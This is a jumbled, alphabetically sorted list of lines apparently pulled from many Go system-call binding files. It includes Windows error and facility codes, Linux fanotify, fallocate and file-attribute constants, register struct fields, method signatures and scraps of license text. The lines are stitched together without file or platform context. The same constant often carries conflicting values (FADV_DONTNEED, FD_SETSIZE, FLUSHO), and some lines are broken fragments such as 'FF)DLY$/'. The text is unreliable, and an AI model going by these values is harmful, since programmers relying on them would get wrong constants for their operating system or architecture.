E_MULTIPLE_EXTENSIONS_FOR_APPLICATION                                     Handle        = 0x80270255
E_MULTIPLE_PACKAGES_FOR_FAMILY                                            Handle        = 0x80270256
E_NOINTERFACE                                                             Handle        = 0x80004002
E_NOTIMPL                                                                 Handle        = 0x80004001
E_NOT_SET                                                                               = ERROR_NOT_FOUND
E_NOT_SUFFICIENT_BUFFER                                                                 = ERROR_INSUFFICIENT_BUFFER
E_NOT_VALID_STATE                                                                       = ERROR_INVALID_STATE
E_NO_TASK_QUEUE                                                                         = ERROR_NO_TASK_QUEUE
E_OUTOFMEMORY                                                             Handle        = 0x8007000E
E_PENDING                                                                 Handle        = 0x8000000A
E_POINTER                                                                 Handle        = 0x80004003
E_PROTOCOL_EXTENSIONS_NOT_SUPPORTED                                       Handle        = 0x83760003
E_PROTOCOL_VERSION_NOT_SUPPORTED                                          Handle        = 0x83760005
E_SKYDRIVE_FILE_NOT_UPLOADED                                              Handle        = 0x80270263
E_SKYDRIVE_ROOT_TARGET_CANNOT_INDEX                                       Handle        = 0x80270262
E_SKYDRIVE_ROOT_TARGET_FILE_SYSTEM_NOT_SUPPORTED                          Handle        = 0x80270260
E_SKYDRIVE_ROOT_TARGET_OVERLAP                                            Handle        = 0x80270261
E_SKYDRIVE_ROOT_TARGET_VOLUME_ROOT_NOT_SUPPORTED                          Handle        = 0x80270265
E_SKYDRIVE_UPDATE_AVAILABILITY_FAIL                                       Handle        = 0x80270264
E_STRING_NOT_NULL_TERMINATED                                              Handle        = 0x80000017
E_SUBPROTOCOL_NOT_SUPPORTED                                               Handle        = 0x83760004
E_SYNCENGINE_CLIENT_UPDATE_NEEDED                                         Handle        = 0x8802D006
E_SYNCENGINE_FILE_IDENTIFIER_UNKNOWN                                      Handle        = 0x8802C002
E_SYNCENGINE_FILE_SIZE_EXCEEDS_REMAINING_QUOTA                            Handle        = 0x8802B002
E_SYNCENGINE_FILE_SIZE_OVER_LIMIT                                         Handle        = 0x8802B001
E_SYNCENGINE_FILE_SYNC_PARTNER_ERROR                                      Handle        = 0x8802B005
E_SYNCENGINE_FOLDER_INACCESSIBLE                                          Handle        = 0x8802D001
E_SYNCENGINE_FOLDER_IN_REDIRECTION                                        Handle        = 0x8802D00B
E_SYNCENGINE_FOLDER_ITEM_COUNT_LIMIT_EXCEEDED                             Handle        = 0x8802B004
E_SYNCENGINE_PATH_LENGTH_LIMIT_EXCEEDED                                   Handle        = 0x8802D004
E_SYNCENGINE_PROXY_AUTHENTICATION_REQUIRED                                Handle        = 0x8802D007
E_SYNCENGINE_REMOTE_PATH_LENGTH_LIMIT_EXCEEDED                            Handle        = 0x8802D005
E_SYNCENGINE_REQUEST_BLOCKED_BY_SERVICE                                   Handle        = 0x8802C006
E_SYNCENGINE_REQUEST_BLOCKED_DUE_TO_CLIENT_ERROR                          Handle        = 0x8802C007
E_SYNCENGINE_SERVICE_AUTHENTICATION_FAILED                                Handle        = 0x8802C003
E_SYNCENGINE_SERVICE_RETURNED_UNEXPECTED_SIZE                             Handle        = 0x8802C005
E_SYNCENGINE_STORAGE_SERVICE_BLOCKED                                      Handle        = 0x8802D00A
E_SYNCENGINE_STORAGE_SERVICE_PROVISIONING_FAILED                          Handle        = 0x8802D008
E_SYNCENGINE_SYNC_PAUSED_BY_SERVICE                                       Handle        = 0x8802B006
E_SYNCENGINE_UNKNOWN_SERVICE_ERROR                                        Handle        = 0x8802C004
E_SYNCENGINE_UNSUPPORTED_FILE_NAME                                        Handle        = 0x8802B003
E_SYNCENGINE_UNSUPPORTED_FOLDER_NAME                                      Handle        = 0x8802D002
E_SYNCENGINE_UNSUPPORTED_MARKET                                           Handle        = 0x8802D003
E_SYNCENGINE_UNSUPPORTED_REPARSE_POINT                                    Handle        = 0x8802D009
E_TIME_SENSITIVE_THREAD                                                                 = ERROR_TIME_SENSITIVE_THREAD
E_UAC_DISABLED                                                            Handle        = 0x80270252
E_UNEXPECTED                                                              Handle        = 0x8000FFFF
Eax      int32
Eax    uint32
Ebp      int32
Ebp    uint32
Ebx      int32
Ebx    uint32
Ecc_bytes      uint16
Eccbytes uint32
Eccpos   [32]uint32
Eccpos   [64]uint32
Ecx      int32
Ecx    uint32
Edi      int32
Edi    uint32
Edx      int32
Edx    uint32
Eedump_len   uint32
Effective   uint32
EffectiveOnly       byte
Eflags   int32
Eflags   uint64
Eflags uint32
Eide_dma_min   uint16
Eide_dma_time  uint16
Eide_pio       uint16
Eide_pio_iordy uint16
Eide_pio_modes uint16
Eip      int32
Eip    uint32
ElementIndex      uint32
Elements                   
Elr  uint64
Enabled uint8
EncodedCert  
EncodingType uint32
Encrypt_cnt  uint64
Encrypt_key      [32]uint8
Encrypt_key_size int32
Encrypt_key_size uint32
Encrypt_tlen uint64
Encrypt_type     int32
Encrypt_type     uint32
EndAddress   uint32
Ending_addr   uint64
EntryPoint  uintptr
Env   [4]uint64
Env   [7]uint32
Env: []string{
Environment      unsafe.Pointer
Epc      uint64
Epoch       int32
Epoch       int64
EpollEvent
EpollEvent) (err error)
EpollEvent) (err error) {
Eproc Eproc
EqualSid(sid1 
Equals()
Era      uint64
EraseInfo struct {
EraseInfo64 struct {
Erasesize   uint32
Erasesize uint32
Erom_version [32]byte
Err     error
Err    uint32
Err2ad() (eadd 
Err_cnt                   uint64
Err_cnt         uint64
Err_cnt       uint64
Err_cnt      uint64
Err_cnt   uint64
Errcnt    int32
Errcnt    int64
Errno     int32
Errno    int32
Errno   int32
Errno  int32
Errno  uint32
Errno int32
Errno2() (er2 int) = SYS___ERRNO2
Error             uint32
Error int32
ErrorControl     uint32
ErrorStatus uint32
Error_passive    uint32
Error_warning    uint32
Es       uint64
Es     uint16
Es     uint32
Escape 
Escape:       
EscapeCodes
Esi      int32
Esi    uint32
Esp      int32
Esp    uint32
Esterror  int32
Esterror  int64
Event        int32
Event uint32
EventPort) Close() error {
EventPort) DissociateFd(fd uintptr) error {
EventPort) DissociatePath(path string) error {
EventPort) FdIsWatched(fd uintptr) bool {
EventPort) GetOne(t 
EventPort) PathIsWatched(path string) bool {
EventPort) peIntToExt(peInt 
EventPort{
Event_len    uint32
Event_nr     uint32
Events  int16
Events  uint16
Events int32
Events uint32
Ex_sw uint32
ExactArgs(int)
ExactValidArgs(int)
Example
Example 
Example string
Examples of breaking changes include:
Examples:
ExeFile         [MAX_PATH]uint16
ExePath      [MAX_PATH]uint16
Executable Form
Exhibit A - Source Code Form License Notice
Exhibit B - 
Exit(code int)
Exit(code int) = SYS_EXIT_GROUP
ExitCode uint32
ExitOnError
ExitProcess(exitcode uint32)
ExitStatus                   NTStatus
ExitTime     Filetime
Exit_thread 
ExpandEnvironmentStrings(src 
Expire    uint64
Expire   int32
Expire   int64
Expire   uint32
Expire   uint64
Ext1               uint64
Ext2               uint64
ExtendedErrorInfo 
Extensions           
Extra  uintptr
ExtraPolicyPara Pointer
ExtraPolicyStatus Pointer
F2FS_SUPER_MAGIC                            = 0xf2f52010
FACILITY_AAF                                                                            = 18
FACILITY_ACCELERATOR                                                                    = 1536
FACILITY_ACS                                                                            = 20
FACILITY_ACTION_QUEUE                                                                   = 44
FACILITY_AUDCLNT                                                                        = 2185
FACILITY_AUDIO                                                                          = 102
FACILITY_AUDIOSTREAMING                                                                 = 1094
FACILITY_BACKGROUNDCOPY                                                                 = 32
FACILITY_BCD                                                                            = 57
FACILITY_BLB                                                                            = 120
FACILITY_BLBUI                                                                          = 128
FACILITY_BLB_CLI                                                                        = 121
FACILITY_BLUETOOTH_ATT                                                                  = 101
FACILITY_CERT                                                                           = 11
FACILITY_CMI                                                                            = 54
FACILITY_COMPLUS                                                                        = 17
FACILITY_CONFIGURATION                                                                  = 33
FACILITY_CONTROL                                                                        = 10
FACILITY_DAF                                                                            = 100
FACILITY_DEBUGGERS                                                                      = 176
FACILITY_DEFRAG                                                                         = 2304
FACILITY_DELIVERY_OPTIMIZATION                                                          = 208
FACILITY_DEPLOYMENT_SERVICES_BINLSVC                                                    = 261
FACILITY_DEPLOYMENT_SERVICES_CONTENT_PROVIDER                                           = 293
FACILITY_DEPLOYMENT_SERVICES_DRIVER_PROVISIONING                                        = 278
FACILITY_DEPLOYMENT_SERVICES_IMAGING                                                    = 258
FACILITY_DEPLOYMENT_SERVICES_MANAGEMENT                                                 = 259
FACILITY_DEPLOYMENT_SERVICES_MULTICAST_CLIENT                                           = 290
FACILITY_DEPLOYMENT_SERVICES_MULTICAST_SERVER                                           = 289
FACILITY_DEPLOYMENT_SERVICES_PXE                                                        = 263
FACILITY_DEPLOYMENT_SERVICES_SERVER                                                     = 257
FACILITY_DEPLOYMENT_SERVICES_TFTP                                                       = 264
FACILITY_DEPLOYMENT_SERVICES_TRANSPORT_MANAGEMENT                                       = 272
FACILITY_DEPLOYMENT_SERVICES_UTIL                                                       = 260
FACILITY_DEVICE_UPDATE_AGENT                                                            = 135
FACILITY_DIRECT2D                                                                       = 2201
FACILITY_DIRECT3D10                                                                     = 2169
FACILITY_DIRECT3D11                                                                     = 2172
FACILITY_DIRECT3D11_DEBUG                                                               = 2173
FACILITY_DIRECT3D12                                                                     = 2174
FACILITY_DIRECT3D12_DEBUG                                                               = 2175
FACILITY_DIRECTMUSIC                                                                    = 2168
FACILITY_DIRECTORYSERVICE                                                               = 37
FACILITY_DISPATCH                                                                       = 2
FACILITY_DLS                                                                            = 153
FACILITY_DMSERVER                                                                       = 256
FACILITY_DPLAY                                                                          = 21
FACILITY_DRVSERVICING                                                                   = 136
FACILITY_DXGI                                                                           = 2170
FACILITY_DXGI_DDI                                                                       = 2171
FACILITY_EAP                                                                            = 66
FACILITY_EAS                                                                            = 85
FACILITY_FVE                                                                            = 49
FACILITY_FWP                                                                            = 50
FACILITY_GAME                                                                           = 2340
FACILITY_GRAPHICS                                                                       = 38
FACILITY_HTTP                                                                           = 25
FACILITY_INPUT                                                                          = 64
FACILITY_INTERNET                                                                       = 12
FACILITY_ITF                                                                            = 4
FACILITY_JSCRIPT                                                                        = 2306
FACILITY_LEAP                                                                           = 2184
FACILITY_LINGUISTIC_SERVICES                                                            = 305
FACILITY_MBN                                                                            = 84
FACILITY_MEDIASERVER                                                                    = 13
FACILITY_METADIRECTORY                                                                  = 35
FACILITY_MOBILE                                                                         = 1793
FACILITY_MSMQ                                                                           = 14
FACILITY_NAP                                                                            = 39
FACILITY_NDIS                                                                           = 52
FACILITY_NT_BIT                                                                         = 0x10000000
FACILITY_NULL                                                                           = 0
FACILITY_ONLINE_ID                                                                      = 134
FACILITY_OPC                                                                            = 81
FACILITY_P2P                                                                            = 99
FACILITY_P2P_INT                                                                        = 98
FACILITY_PARSE                                                                          = 113
FACILITY_PIDGENX                                                                        = 2561
FACILITY_PIX                                                                            = 2748
FACILITY_PLA                                                                            = 48
FACILITY_POWERSHELL                                                                     = 84
FACILITY_RAS                                                                            = 83
FACILITY_RESTORE                                                                        = 256
FACILITY_RPC                                                                            = 1
FACILITY_SCARD                                                                          = 16
FACILITY_SCRIPT                                                                         = 112
FACILITY_SDIAG                                                                          = 60
FACILITY_SECURITY                                                                       = 9
FACILITY_SETUPAPI                                                                       = 15
FACILITY_SHELL                                                                          = 39
FACILITY_SOS                                                                            = 160
FACILITY_SPP                                                                            = 256
FACILITY_SQLITE                                                                         = 1967
FACILITY_SSPI                                                                           = 9
FACILITY_STATEREPOSITORY                                                                = 103
FACILITY_STATE_MANAGEMENT                                                               = 34
FACILITY_STORAGE                                                                        = 3
FACILITY_SXS                                                                            = 23
FACILITY_SYNCENGINE                                                                     = 2050
FACILITY_TIERING                                                                        = 131
FACILITY_TPM_SERVICES                                                                   = 40
FACILITY_TPM_SOFTWARE                                                                   = 41
FACILITY_UI                                                                             = 42
FACILITY_UMI                                                                            = 22
FACILITY_URT                                                                            = 19
FACILITY_USERMODE_COMMONLOG                                                             = 26
FACILITY_USERMODE_FILTER_MANAGER                                                        = 31
FACILITY_USERMODE_HNS                                                                   = 59
FACILITY_USERMODE_HYPERVISOR                                                            = 53
FACILITY_USERMODE_LICENSING                                                             = 234
FACILITY_USERMODE_SDBUS                                                                 = 2305
FACILITY_USERMODE_SPACES                                                                = 231
FACILITY_USERMODE_VHD                                                                   = 58
FACILITY_USERMODE_VIRTUALIZATION                                                        = 55
FACILITY_USERMODE_VOLMGR                                                                = 56
FACILITY_USERMODE_VOLSNAP                                                               = 130
FACILITY_USER_MODE_SECURITY_CORE                                                        = 232
FACILITY_USN                                                                            = 129
FACILITY_UTC                                                                            = 1989
FACILITY_VISUALCPP                                                                      = 109
FACILITY_WEB                                                                            = 885
FACILITY_WEBSERVICES                                                                    = 61
FACILITY_WEB_SOCKET                                                                     = 886
FACILITY_WEP                                                                            = 2049
FACILITY_WER                                                                            = 27
FACILITY_WIA                                                                            = 33
FACILITY_WIN32                                                                          = 7
FACILITY_WINCODEC_DWRITE_DWM                                                            = 2200
FACILITY_WINDOWS                                                                        = 8
FACILITY_WINDOWSUPDATE                                                                  = 36
FACILITY_WINDOWS_CE                                                                     = 24
FACILITY_WINDOWS_DEFENDER                                                               = 80
FACILITY_WINDOWS_SETUP                                                                  = 48
FACILITY_WINDOWS_STORE                                                                  = 63
FACILITY_WINML                                                                          = 2192
FACILITY_WINPE                                                                          = 61
FACILITY_WINRM                                                                          = 51
FACILITY_WMAAECMA                                                                       = 1996
FACILITY_WPN                                                                            = 62
FACILITY_WSBAPP                                                                         = 122
FACILITY_WSB_ONLINE                                                                     = 133
FACILITY_XAML                                                                           = 43
FACILITY_XBOX                                                                           = 2339
FACILITY_XPS                                                                            = 82
FADV_DONTNEED   = 0x4
FADV_DONTNEED = 0x4
FADV_DONTNEED = 0x6
FADV_NOREUSE    = 0x5
FADV_NOREUSE  = 0x5
FADV_NOREUSE  = 0x7
FADV_NORMAL     = 0x0
FADV_RANDOM     = 0x1
FADV_SEQUENTIAL = 0x2
FADV_WILLNEED   = 0x3
FALLOC_/ 
FALLOC_FL_COLLAPSE_RANGE                    = 0x8
FALLOC_FL_INSERT_RANGE                      = 0x20
FALLOC_FL_KEEP_SIZE                         = 0x1
FALLOC_FL_NO_HIDE_STALE                     = 0x4
FALLOC_FL_PUNCH_HOLE                        = 0x2
FALLOC_FL_UNSHARE_RANGE                     = 0x40
FALLOC_FL_ZERO_RANGE                        = 0x10
FANOTIFY_/ 
FANOTIFY_METADATA_VERSION                   = 0x3
FAN_
FAN_ACCESS                                  = 0x1
FAN_ACCESS_PERM                             = 0x20000
FAN_ALLOW                                   = 0x1
FAN_ALL_CLASS_BITS                          = 0xc
FAN_ALL_EVENTS                              = 0x3b
FAN_ALL_INIT_FLAGS                          = 0x3f
FAN_ALL_MARK_FLAGS                          = 0xff
FAN_ALL_OUTGOING_EVENTS                     = 0x3403b
FAN_ALL_PERM_EVENTS                         = 0x30000
FAN_ATTRIB                                  = 0x4
FAN_AUDIT                                   = 0x10
FAN_CLASS_CONTENT                           = 0x4
FAN_CLASS_NOTIF                             = 0x0
FAN_CLASS_PRE_CONTENT                       = 0x8
FAN_CLOEXEC                                 = 0x1
FAN_CLOSE                                   = 0x18
FAN_CLOSE_NOWRITE                           = 0x10
FAN_CLOSE_WRITE                             = 0x8
FAN_CREATE                                  = 0x100
FAN_DELETE                                  = 0x200
FAN_DELETE_SELF                             = 0x400
FAN_DENY                                    = 0x2
FAN_ENABLE_AUDIT                            = 0x40
FAN_EPIDFD                                  = -0x2
FAN_EVENT_INFO_TYPE_DFID                    = 0x3
FAN_EVENT_INFO_TYPE_DFID_NAME               = 0x2
FAN_EVENT_INFO_TYPE_ERROR                   = 0x5
FAN_EVENT_INFO_TYPE_FID                     = 0x1
FAN_EVENT_INFO_TYPE_NEW_DFID_NAME           = 0xc
FAN_EVENT_INFO_TYPE_OLD_DFID_NAME           = 0xa
FAN_EVENT_INFO_TYPE_PIDFD                   = 0x4
FAN_EVENT_METADATA_LEN                      = 0x18
FAN_EVENT_ON_CHILD                          = 0x8000000
FAN_FS_ERROR                                = 0x8000
FAN_MARK_ADD                                = 0x1
FAN_MARK_DONT_FOLLOW                        = 0x4
FAN_MARK_EVICTABLE                          = 0x200
FAN_MARK_FILESYSTEM                         = 0x100
FAN_MARK_FLUSH                              = 0x80
FAN_MARK_IGNORED_MASK                       = 0x20
FAN_MARK_IGNORED_SURV_MODIFY                = 0x40
FAN_MARK_INODE                              = 0x0
FAN_MARK_MOUNT                              = 0x10
FAN_MARK_ONLYDIR                            = 0x8
FAN_MARK_REMOVE                             = 0x2
FAN_MODIFY                                  = 0x2
FAN_MOVE                                    = 0xc0
FAN_MOVED_FROM                              = 0x40
FAN_MOVED_TO                                = 0x80
FAN_MOVE_SELF                               = 0x800
FAN_NOFD                                    = -0x1
FAN_NONBLOCK                                = 0x2
FAN_NOPIDFD                                 = -0x1
FAN_ONDIR                                   = 0x40000000
FAN_OPEN                                    = 0x20
FAN_OPEN_EXEC                               = 0x1000
FAN_OPEN_EXEC_PERM                          = 0x40000
FAN_OPEN_PERM                               = 0x10000
FAN_Q_OVERFLOW                              = 0x4000
FAN_RENAME                                  = 0x10000000
FAN_REPORT_DFID_NAME                        = 0xc00
FAN_REPORT_DFID_NAME_TARGET                 = 0x1e00
FAN_REPORT_DIR_FID                          = 0x400
FAN_REPORT_FID                              = 0x200
FAN_REPORT_NAME                             = 0x800
FAN_REPORT_PIDFD                            = 0x80
FAN_REPORT_TARGET_FID                       = 0x1000
FAN_REPORT_TID                              = 0x100
FAN_UNLIMITED_MARKS                         = 0x20
FAN_UNLIMITED_QUEUE                         = 0x10
FA_E_HOMEGROUP_NOT_AVAILABLE                                              Handle        = 0x80270222
FA_E_MAX_PERSISTED_ITEMS_REACHED                                          Handle        = 0x80270220
FD_CLOEXEC                                  = 0x1
FD_CLOEXEC                              = 0x1
FD_CLOEXEC                        = 0x1
FD_CLOEXEC                      = 0x01
FD_CLOEXEC                     = 0x1
FD_CLOEXEC                    = 0x1
FD_CLOFORK                      = 0x02
FD_NFDBITS                    = 0x40
FD_SETSIZE                                  = 0x400
FD_SETSIZE                              = 0x400
FD_SETSIZE                        = 0x100
FD_SETSIZE                        = 0x400
FD_SETSIZE                     = 0x400
FD_SETSIZE                    = 0x10000
FD_SETSIZE                    = 0xfffe
FEATURES:
FF)DLY$/ 
FF)[0-9]$/ 
FF0                                         = 0x0
FF0                                     = 0x0
FF0                           = 0x0
FF1                                     = 0x4000
FF1                              = 0x4000
FF1                              = 0x8000
FF1                           = 0x2000
FF1                           = 0x8000
FFDLY                                   = 0x4000
FFDLY                            = 0x4000
FFDLY                            = 0x8000
FFDLY                         = 0x2000
FFDLY                         = 0x8000
FI(CLONE
FIB_RULE_/ 
FIB_RULE_DEV_DETACHED                       = 0x8
FIB_RULE_FIND_SADDR                         = 0x10000
FIB_RULE_IIF_DETACHED                       = 0x8
FIB_RULE_INVERT                             = 0x2
FIB_RULE_OIF_DETACHED                       = 0x10
FIB_RULE_PERMANENT                          = 0x1
FIB_RULE_UNRESOLVED                         = 0x4
FICLONE                          = 0x40049409
FICLONE                          = 0x80049409
FICLONERANGE                     = 0x4020940d
FICLONERANGE                     = 0x8020940d
FIDEDUPERANGE                               = 0xc0189436
FILE)_)/ 
FILE_ACCESS        = 0x1
FILE_ACTION_ADDED = iota 
FILE_ACTION_MODIFIED
FILE_ACTION_REMOVED
FILE_ACTION_RENAMED_NEW_NAME
FILE_ACTION_RENAMED_OLD_NAME
FILE_APPEND_DATA      = 0x00000004
FILE_ATTRIB        = 0x4
FILE_ATTRIBUTE_ARCHIVE               = 0x00000020
FILE_ATTRIBUTE_COMPRESSED            = 0x00000800
FILE_ATTRIBUTE_DEVICE                = 0x00000040
FILE_ATTRIBUTE_DIRECTORY             = 0x00000010
FILE_ATTRIBUTE_ENCRYPTED             = 0x00004000
FILE_ATTRIBUTE_HIDDEN                = 0x00000002
FILE_ATTRIBUTE_INTEGRITY_STREAM      = 0x00008000
FILE_ATTRIBUTE_NORMAL                = 0x00000080
FILE_ATTRIBUTE_NOT_CONTENT_INDEXED   = 0x00002000
FILE_ATTRIBUTE_NO_SCRUB_DATA         = 0x00020000
FILE_ATTRIBUTE_OFFLINE               = 0x00001000
FILE_ATTRIBUTE_READONLY              = 0x00000001
FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS = 0x00400000
FILE_ATTRIBUTE_RECALL_ON_OPEN        = 0x00040000
FILE_ATTRIBUTE_REPARSE_POINT         = 0x00000400
FILE_ATTRIBUTE_SPARSE_FILE           = 0x00000200
FILE_ATTRIBUTE_SYSTEM                = 0x00000004
FILE_ATTRIBUTE_TEMPORARY             = 0x00000100
FILE_ATTRIBUTE_VIRTUAL               = 0x00010000
FILE_BEGIN   = 0
FILE_CASE_PRESERVED_NAMES         = 0x00000002
FILE_CASE_SENSITIVE_SEARCH        = 0x00000001
FILE_COMPLETE_IF_OPLOCKED      = 0x00000100
FILE_CREATE              = 0x00000002
FILE_CREATE_TREE_CONNECTION    = 0x00000080
FILE_CS_FLAG_CASE_SENSITIVE_DIR = 0x00000001
FILE_CURRENT = 1
FILE_DAX_VOLUME                   = 0x20000000
FILE_DEDUPE_RANGE_DIFFERS    = 0x1
FILE_DEDUPE_RANGE_SAME       = 0x0
FILE_DELETE        = 0x10
FILE_DELETE_ON_CLOSE           = 0x00001000
FILE_DIRECTORY_FILE            = 0x00000001
FILE_DISALLOW_EXCLUSIVE        = 0x00020000
FILE_DISPOSITION_DELETE                    = 0x00000001
FILE_DISPOSITION_DO_NOT_DELETE             = 0x00000000
FILE_DISPOSITION_FORCE_IMAGE_SECTION_CHECK = 0x00000004
FILE_DISPOSITION_IGNORE_READONLY_ATTRIBUTE = 0x00000010
FILE_DISPOSITION_ON_CLOSE                  = 0x00000008
FILE_DISPOSITION_POSIX_SEMANTICS           = 0x00000002
FILE_END     = 2
FILE_EXCEPTION     = 0x60000070
FILE_EXECUTE          = 0x00000020
FILE_FILE_COMPRESSION             = 0x00000010
FILE_FLAG_BACKUP_SEMANTICS      = 0x02000000
FILE_FLAG_DELETE_ON_CLOSE       = 0x04000000
FILE_FLAG_FIRST_PIPE_INSTANCE   = 0x00080000
FILE_FLAG_NO_BUFFERING          = 0x20000000
FILE_FLAG_OPEN_NO_RECALL        = 0x00100000
FILE_FLAG_OPEN_REPARSE_POINT
FILE_FLAG_OPEN_REPARSE_POINT    = 0x00200000
FILE_FLAG_OPEN_REQUIRING_OPLOCK = 0x00040000
FILE_FLAG_OVERLAPPED            = 0x40000000
FILE_FLAG_POSIX_SEMANTICS       = 0x01000000
FILE_FLAG_RANDOM_ACCESS         = 0x10000000
FILE_FLAG_SEQUENTIAL_SCAN       = 0x08000000
FILE_FLAG_SESSION_AWARE         = 0x00800000
FILE_FLAG_WRITE_THROUGH         = 0x80000000
FILE_GENERIC_EXECUTE = STANDARD_RIGHTS_EXECUTE 
FILE_GENERIC_READ    = STANDARD_RIGHTS_READ 
FILE_GENERIC_WRITE   = STANDARD_RIGHTS_WRITE 
FILE_LINK_FORCE_RESIZE_SOURCE_SR               = 0x00000100
FILE_LINK_FORCE_RESIZE_SR                      = 0x00000180
FILE_LINK_FORCE_RESIZE_TARGET_SR               = 0x00000080
FILE_LINK_IGNORE_READONLY_ATTRIBUTE            = 0x00000040
FILE_LINK_NO_DECREASE_AVAILABLE_SPACE          = 0x00000020
FILE_LINK_NO_INCREASE_AVAILABLE_SPACE          = 0x00000010
FILE_LINK_POSIX_SEMANTICS                      = 0x00000002
FILE_LINK_PRESERVE_AVAILABLE_SPACE             = 0x00000030
FILE_LINK_REPLACE_IF_EXISTS                    = 0x00000001
FILE_LINK_SUPPRESS_STORAGE_RESERVE_INHERITANCE = 0x00000008
FILE_LIST_DIRECTORY = 0x00000001
FILE_MAP_COPY    = 0x01
FILE_MAP_EXECUTE = 0x20
FILE_MAP_READ    = 0x04
FILE_MAP_WRITE   = 0x02
FILE_MAXIMUM_DISPOSITION = 0x00000005
FILE_MODIFIED      = 0x2
FILE_NAMED_STREAMS                = 0x00040000
FILE_NOFOLLOW      = 0x10000000
FILE_NON_DIRECTORY_FILE        = 0x00000040
FILE_NOTIFY_CHANGE_ATTRIBUTES  = 0x004
FILE_NOTIFY_CHANGE_CREATION    = 0x040
FILE_NOTIFY_CHANGE_DIR_NAME    = 0x002
FILE_NOTIFY_CHANGE_FILE_NAME   = 0x001
FILE_NOTIFY_CHANGE_LAST_ACCESS = 0x020
FILE_NOTIFY_CHANGE_LAST_WRITE  = 0x010
FILE_NOTIFY_CHANGE_SECURITY    = 0x100
FILE_NOTIFY_CHANGE_SIZE        = 0x008
FILE_NO_COMPRESSION            = 0x00008000
FILE_NO_EA_KNOWLEDGE           = 0x00000200
FILE_NO_INTERMEDIATE_BUFFERING = 0x00000008
FILE_OPEN                = 0x00000001
FILE_OPEN_BY_FILE_ID           = 0x00002000
FILE_OPEN_FOR_BACKUP_INTENT    = 0x00004000
FILE_OPEN_FOR_FREE_SPACE_QUERY = 0x00800000
FILE_OPEN_IF             = 0x00000003
FILE_OPEN_NO_RECALL            = 0x00400000
FILE_OPEN_REMOTE_INSTANCE      = 0x00000400
FILE_OPEN_REPARSE_POINT        = 0x00200000
FILE_OPEN_REQUIRING_OPLOCK     = 0x00010000
FILE_OVERWRITE           = 0x00000004
FILE_OVERWRITE_IF        = 0x00000005
FILE_PERSISTENT_ACLS              = 0x00000008
FILE_PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000
FILE_PIPE_BYTE_STREAM_MODE = 0x00000000
FILE_PIPE_BYTE_STREAM_TYPE = 0x00000000
FILE_PIPE_CLIENT_END = 0x00000000
FILE_PIPE_CLOSING_STATE      = 0x00000004
FILE_PIPE_COMPLETE_OPERATION = 0x00000001
FILE_PIPE_CONNECTED_STATE    = 0x00000003
FILE_PIPE_DISCONNECTED_STATE = 0x00000001
FILE_PIPE_FULL_DUPLEX = 0x00000002
FILE_PIPE_INBOUND     = 0x00000000
FILE_PIPE_LISTENING_STATE    = 0x00000002
FILE_PIPE_MESSAGE_MODE     = 0x00000001
FILE_PIPE_MESSAGE_TYPE     = 0x00000001
FILE_PIPE_OUTBOUND    = 0x00000001
FILE_PIPE_QUEUE_OPERATION    = 0x00000000
FILE_PIPE_REJECT_REMOTE_CLIENTS = 0x00000002
FILE_PIPE_SERVER_END = 0x00000001
FILE_PIPE_TYPE_VALID_MASK = 0x00000003
FILE_RANDOM_ACCESS             = 0x00000800
FILE_READ_ATTRIBUTES  = 0x00000080
FILE_READ_DATA        = 0x00000001
FILE_READ_EA          = 0x00000008
FILE_READ_ONLY_VOLUME             = 0x00080000
FILE_RENAME_FORCE_RESIZE_SOURCE_SR               = 0x00000100
FILE_RENAME_FORCE_RESIZE_SR                      = 0x00000180
FILE_RENAME_FORCE_RESIZE_TARGET_SR               = 0x00000080
FILE_RENAME_FROM   = 0x40
FILE_RENAME_IGNORE_READONLY_ATTRIBUTE            = 0x00000040
FILE_RENAME_NO_DECREASE_AVAILABLE_SPACE          = 0x00000020
FILE_RENAME_NO_INCREASE_AVAILABLE_SPACE          = 0x00000010
FILE_RENAME_POSIX_SEMANTICS                      = 0x00000002
FILE_RENAME_PRESERVE_AVAILABLE_SPACE             = 0x00000030
FILE_RENAME_REPLACE_IF_EXISTS                    = 0x00000001
FILE_RENAME_SUPPRESS_PIN_STATE_INHERITANCE       = 0x00000004
FILE_RENAME_SUPPRESS_STORAGE_RESERVE_INHERITANCE = 0x00000008
FILE_RENAME_TO     = 0x20
FILE_RESERVE_OPFILTER          = 0x00100000
FILE_SEQUENTIAL_ONLY           = 0x00000004
FILE_SEQUENTIAL_WRITE_ONCE        = 0x00100000
FILE_SHARE_DELETE = 0x00000004
FILE_SHARE_READ   = 0x00000001
FILE_SHARE_WRITE  = 0x00000002
FILE_SKIP_COMPLETION_PORT_ON_SUCCESS = 1
FILE_SKIP_SET_EVENT_ON_HANDLE        = 2
FILE_SUPERSEDE           = 0x00000000
FILE_SUPPORTS_ENCRYPTION          = 0x00020000
FILE_SUPPORTS_EXTENDED_ATTRIBUTES = 0x00800000
FILE_SUPPORTS_HARD_LINKS          = 0x00400000
FILE_SUPPORTS_OBJECT_IDS          = 0x00010000
FILE_SUPPORTS_OPEN_BY_FILE_ID     = 0x01000000
FILE_SUPPORTS_REPARSE_POINTS      = 0x00000080
FILE_SUPPORTS_SPARSE_FILES        = 0x00000040
FILE_SUPPORTS_TRANSACTIONS        = 0x00200000
FILE_SUPPORTS_USN_JOURNAL         = 0x02000000
FILE_SYNCHRONOUS_IO_ALERT      = 0x00000010
FILE_SYNCHRONOUS_IO_NONALERT   = 0x00000020
FILE_TRAVERSE       = 0x00000020
FILE_TRUNC         = 0x100000
FILE_TYPE_CHAR    = 0x0002
FILE_TYPE_DISK    = 0x0001
FILE_TYPE_PIPE    = 0x0003
FILE_TYPE_REMOTE  = 0x8000
FILE_TYPE_UNKNOWN = 0x0000
FILE_UNICODE_ON_DISK              = 0x00000004
FILE_VOLUME_IS_COMPRESSED         = 0x00008000
FILE_VOLUME_QUOTAS                = 0x00000020
FILE_WRITE_ATTRIBUTES = 0x00000100
FILE_WRITE_DATA       = 0x00000002
FILE_WRITE_EA         = 0x00000010
FILE_WRITE_THROUGH             = 0x00000002
FIORDCHK                      = 0x6603
FIORDCHK$/ 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
FL)$/ {next}  
FLUSHALL                      = 0x1
FLUSHBAND                     = 0x40
FLUSHDATA                     = 0x0
FLUSHLOW                      = 0x8
FLUSHO                                  = 0x800000
FLUSHO                            = 0x800000
FLUSHO                           = 0x1000
FLUSHO                           = 0x2000
FLUSHO                           = 0x800000
FLUSHO                         = 0x800000
FLUSHO                        = 0x100000
